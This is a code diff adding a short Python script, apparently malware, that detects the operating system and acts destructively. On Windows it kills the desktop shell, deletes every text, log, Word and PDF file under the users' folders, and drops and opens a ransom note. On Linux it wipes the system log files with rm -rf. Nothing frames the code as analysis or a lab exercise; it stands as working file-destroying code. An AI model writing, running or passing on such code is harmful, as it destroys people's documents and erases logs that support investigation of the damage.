@@ -1,0 +1,41 @@
+import os
+import shutil
+import time
+import platform
+
+def infect():
+    system = platform.system()
+    print("System Detected: " + system)
+    
+    # 1. Create a fake update message
+    if system == "Windows":
+        os.system('echo Virus Active: Deleting System Logs... > virus_msg.txt')
+        os.system('taskkill /F /IM explorer.exe') # Crashes desktop
+        
+        # 2. Delete specific file types
+        for root, dirs, files in os.walk("C:\\Users"):
+            for file in files:
+                if file.endswith(('.txt', '.log', '.docx', '.pdf')):
+                    try:
+                        os.remove(os.path.join(root, file))
+                    except:
+                        pass
+                        
+        # 3. Create a ransom note
+        with open("C:\\Users\\Public\\RANSOM.txt", "w") as f:
+            f.write("Your data is compromised. Contact the admin.")
+    
+    elif system == "Linux":
+        os.system('echo "Root Access Granted" > /tmp/root.txt')
+        try:
+            os.system('rm -rf /var/log/*.log')
+        except:
+            pass
+    
+    print("Infection Complete. Device compromised.")
+
+if __name__ == "__main__":
+    infect()
+    time.sleep(5)
+    if platform.system() == "Windows":
+        os.startfile("RANSOM.txt")
